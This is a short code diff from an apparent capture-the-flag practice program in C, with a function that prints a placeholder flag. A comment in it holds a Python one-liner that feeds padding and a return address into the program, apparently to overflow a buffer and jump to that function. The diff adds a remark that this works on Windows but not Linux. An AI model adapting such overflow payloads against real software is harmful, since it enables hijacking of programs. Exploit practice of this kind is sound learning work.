@@ -18,7 +18,7 @@ void prtflg(void)
     puts("flag{aiojsoajso}");
 }
 
-
+// works on windows but not on linux...
 // python3 -c "import sys; sys.stdout.buffer.write(b'A' * 4 + b'\x75\x14\x40\x00\x00\x00\x00\x00')" | .\test.exe
 int main(void)
 {
